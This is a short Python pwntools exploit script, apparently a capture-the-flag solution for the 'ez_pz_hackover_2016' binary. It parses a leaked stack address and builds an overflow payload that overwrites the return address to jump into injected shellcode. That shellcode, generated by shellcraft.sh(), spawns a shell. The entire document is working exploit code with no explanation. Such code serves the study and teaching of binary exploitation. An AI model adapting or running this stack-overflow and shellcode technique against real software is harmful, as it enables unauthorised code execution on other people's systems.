from pwn import *
context.log_level = 'debug'
#io = process('./ez_pz_hackover_2016')
io = gdb.debug('./ez_pz_hackover_2016','break vuln')
elf = ELF('./ez_pz_hackover_2016')
io.recvuntil(b'Yippie, lets crash: ')
s_addr = int(io.recv(10),16)
print('s_addr',hex(s_addr))

payload1 = b'crashme\x00'
payload1 = payload1.ljust(0x1a,b'A')
payload1 += p32(s_addr-0x1c)+asm(shellcraft.sh())
io.sendlineafter('> ',payload1)
io.interactive()
